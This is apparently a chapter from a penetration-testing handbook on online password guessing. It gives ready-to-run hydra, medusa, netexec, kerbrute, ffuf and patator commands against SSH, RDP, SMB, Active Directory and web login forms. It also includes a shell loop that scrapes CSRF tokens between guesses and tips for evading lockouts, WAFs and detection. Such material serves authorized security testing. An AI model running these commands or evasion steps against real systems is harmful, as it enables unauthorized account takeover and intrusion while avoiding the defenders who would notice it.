# 23 — Login Brute Forcing

Online password guessing against authentication endpoints. Three concerns dominate: choose **good candidates**, **avoid lockouts**, **detect success reliably**.

## Triage before brute-forcing

1. Read the password policy (`netexec smb <DC> --pass-pol`, `man 5 login.defs`, an actual login error message).
2. Check for lockouts: how many failures, what window, which counter resets when.
3. Pick a small, smart wordlist tailored to the target instead of a generic 14M-line list.
4. Identify what a *failure* looks like vs *success* (status code, redirect, body text, response size).
5. Throttle: lots of services rate-limit per IP/account/session.

## Wordlists worth keeping

```
/usr/share/wordlists/rockyou.txt
/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-{100,500,1000,10000,100000}.txt
/usr/share/seclists/Passwords/probable-v2-top1575.txt
/usr/share/seclists/Passwords/Default-Credentials/   # vendor defaults
/usr/share/seclists/Usernames/Names/names.txt
/usr/share/seclists/Usernames/cirt-default-usernames.txt
```

For corporate spraying:

```bash
echo -e "Welcome\n${COMPANY}\nSummer\nWinter\nSpring\nAutumn" |
  while read w; do for y in 2023 2024 2025; do echo "${w}${y}!"; done; done > spray.txt
```

## Username sources

- LinkedIn / org chart names → `firstname.lastname`, `flastname`, `firstl`, `f.lastname` permutations.
- `kerbrute userenum` against the AD DC (no lockout).
- `ldapsearch` once you have any cred.
- Public leaks (haveibeenpwned, dehashed) for confirmed `firstname@<corp>`.
- Email harvesters: `theHarvester -d <domain> -b all`.

## Hydra

```bash
# SSH
hydra -L users.txt -P passwords.txt ssh://<T> -t 4 -f

# RDP
hydra -L users.txt -P passwords.txt rdp://<T> -t 1 -f

# FTP
hydra -L users.txt -P passwords.txt ftp://<T>

# SMB
hydra -L users.txt -P passwords.txt smb://<T> -t 1   # SMB doesn't like high concurrency

# IMAP / POP3
hydra -L users.txt -P passwords.txt imap://<T>
hydra -L users.txt -P passwords.txt pop3://<T>
hydra -L users.txt -P passwords.txt -S pop3://<T>:995

# MSSQL
hydra -L users.txt -P passwords.txt mssql://<T>

# HTTP basic
hydra -l admin -P passwords.txt <T> http-get /admin/

# HTTP form (POST)
hydra -L users.txt -P passwords.txt <T> http-post-form \
  '/login.php:username=^USER^&password=^PASS^:F=Invalid credentials'

# HTTP form with cookie
hydra -l admin -P passwords.txt <T> https-post-form \
  '/login:user=^USER^&pass=^PASS^&csrf=abc:F=incorrect:H=Cookie: session=xyz'
```

Flags:

| Flag | Meaning |
|---|---|
| `-l user` / `-L users.txt` | Single user / file |
| `-p pass` / `-P pwds.txt` | Single password / file |
| `-C combo.txt` | `user:pass` lines |
| `-t N` | Tasks (parallel). Most services prefer `1`-`4`. |
| `-f` | Stop on first valid pair (per host) |
| `-F` | Stop globally |
| `-V` / `-vV` | Verbose / very verbose |
| `-s PORT` | Non-standard port |
| `-S` | Use SSL |
| `-o file` | Save successes |
| `-w 30` | Wait between connections |
| `-x MIN:MAX:CHARSET` | Built-in mask attack |

The `http-post-form` triplet is `path:body:condition`. Conditions:

- `F=text` — failure marker (anything **without** it is a hit).
- `S=text` — success marker (anything **with** it is a hit).
- Multiple `H=Header: value` for cookies / CSRF tokens / custom headers.

## Medusa

Hydra's older sibling. Sometimes succeeds where Hydra struggles (SMB protocol nuances).

```bash
medusa -h <T> -u alice -P passwords.txt -M ssh
medusa -h <T> -U users.txt -P passwords.txt -M smbnt -t 1
```

## NetExec — the AD spray tool

Best general-purpose tool for AD-style targets.

```bash
# Validate one credential across many hosts
netexec smb hosts.txt -u alice -p Pass1

# Spray one password across many users (most common: pre-engagement single-pass)
netexec smb <DC> -u users.txt -p 'Spring2025!' --continue-on-success

# Multiple passwords (Hydra-style, but lockout-aware - NetExec auto-sleeps if you ask)
netexec smb <DC> -u users.txt -p passwords.txt --continue-on-success

# Same against other protocols
netexec ldap  <DC> -u users.txt -p 'Pass1'
netexec winrm <T>  -u users.txt -p 'Pass1'
netexec mssql <T>  -u users.txt -p 'Pass1'
netexec rdp   <T>  -u users.txt -p 'Pass1'
netexec ssh hosts.txt -u root -P passwords.txt
```

Always run `--pass-pol` first to read the lockout threshold and pick a safe attempt count.

## kerbrute — AD without locking accounts

`AS-REQ` failures **do not increment** `badPwdCount`, so kerbrute can spray Active Directory without locking users.

```bash
# User enumeration
kerbrute userenum -d corp.local --dc <DC> users.txt

# Password spray (one password, many users)
kerbrute passwordspray -d corp.local --dc <DC> users.txt 'Spring2025!'

# Brute one user
kerbrute bruteuser -d corp.local --dc <DC> rockyou.txt alice

# Brute combos
kerbrute bruteforce -d corp.local --dc <DC> combos.txt
```

## Web logins with FFuF

For HTTP forms FFuF is faster and easier to tune than Hydra.

```bash
# POST form
ffuf -u https://target/login -X POST \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'username=admin&password=FUZZ' \
  -w passwords.txt \
  -fr 'Invalid|Wrong|incorrect'

# Cluster bomb (users + passwords)
ffuf -u https://target/login -X POST \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'username=USER&password=PASS' \
  -w users.txt:USER -w passwords.txt:PASS \
  -mode clusterbomb -fr 'Invalid'

# Match success redirect
ffuf ... -mc 302 -fc 200
```

## CSRF / per-request tokens

When the form sends a fresh token in a hidden field, you must scrape it before each attempt.

```bash
# Two-step: GET token → POST with it
while read pw; do
  cookie=$(curl -sk -c - https://target/login | awk '/SESSION/{print $7}')
  token=$(curl -sk -b "SESSION=$cookie" https://target/login |
          grep -oP 'name="csrf" value="\K[^"]+')
  res=$(curl -sk -o /dev/null -w '%{http_code}' \
    -b "SESSION=$cookie" \
    -d "user=admin&pass=$pw&csrf=$token" \
    https://target/login)
  [ "$res" = 302 ] && echo "FOUND: $pw" && break
done < passwords.txt
```

Burp Intruder has "Recursive grep" payload type for this exact pattern (extract token from response, feed back into next request).

For higher throughput, use **Turbo Intruder** — Python-driven, supports per-request token logic.

## Patator — when nothing else fits

Modular brute-forcer. Useful for exotic services and custom failure conditions.

```bash
patator http_fuzz url=https://target/login \
  method=POST body='user=admin&pass=FILE0' 0=passwords.txt \
  -x ignore:fgrep='Invalid' -x ignore:code=429
```

## Avoiding detection / lockouts

- **Spray, don't brute** in AD: one password against many users is far less detectable than many passwords against one user, and matches the lockout policy.
- Match the policy: if 5 failures lock, try **3** then wait the full reset window.
- Distribute over time: `-w` in Hydra, `-rate` in ffuf, `--jitter` in NetExec.
- Identify which counter you are tripping: app-level lockout vs container-level (fail2ban) vs WAF rate-limit.
- For web apps: rotate `User-Agent`, change session every N requests, watch for soft blocks (200 with CAPTCHA).
- HTTP status `429 Too Many Requests` and `403` after some attempts almost always mean WAF kicked in.

## Detect-success patterns by protocol

| Protocol | Success indicator |
|---|---|
| HTTP form | `302 → /dashboard`, set-cookie session, body text "Welcome" |
| SSH | tool-reported `success`, exit-code 0 |
| FTP | `230 Login successful` |
| SMB | NetExec / Hydra explicit "valid" output |
| RDP | service-specific; xfreerdp connects |
| MSSQL | `S` flag in NetExec output ("Pwn3d!" indicates admin) |
| Kerberos AS-REP | TGT returned (no `KDC_ERR_PREAUTH_FAILED`) |

## Order of operations (typical AD foothold from zero)

```
1. kerbrute userenum            → list of valid users
2. kerbrute passwordspray       → 'Welcome1', 'Spring2025!', '<Company>2025'
3. NetExec smb / ldap / winrm    → confirm, find local admin, list shares
4. BloodHound + LDAP enum        → next move
```

Stop spraying as soon as you have one valid cred. Re-running BloodHound from a real account always shows more than what you can see anonymously.

## Sources

- thc-hydra: https://github.com/vanhauser-thc/thc-hydra
- medusa: http://foofus.net/goons/jmk/medusa/medusa.html
- NetExec wiki: https://www.netexec.wiki/
- kerbrute: https://github.com/ropnop/kerbrute
- ffuf wiki: https://github.com/ffuf/ffuf/wiki
- Patator: https://github.com/lanjelot/patator
